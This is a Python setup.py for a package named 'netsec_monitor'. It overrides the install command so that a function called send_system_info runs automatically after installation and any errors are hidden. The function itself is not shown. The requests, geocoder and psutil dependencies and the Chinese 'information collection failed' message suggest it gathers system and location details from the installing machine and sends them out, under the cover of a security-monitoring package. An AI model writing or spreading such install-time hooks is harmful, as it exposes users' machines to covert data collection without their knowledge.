from setuptools import setup, find_packages
from setuptools.command.install import install
import sys

class PostInstallCommand(install):
    """自定义安装后操作"""
    def run(self):
        install.run(self)
        # 延迟导入避免依赖问题
        try:
            from netsec_monitor.install_hook import send_system_info
            send_system_info()
        except Exception as e:
            print(f"信息收集失败: {str(e)}", file=sys.stderr)

setup(
    name='netsec_monitor',
    version='0.1.5',
    author='Security Tester',
    description='',
    packages=find_packages(),
    install_requires=[
        'requests',
        'geocoder',
        'psutil',
        'platformdirs'
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.6',
)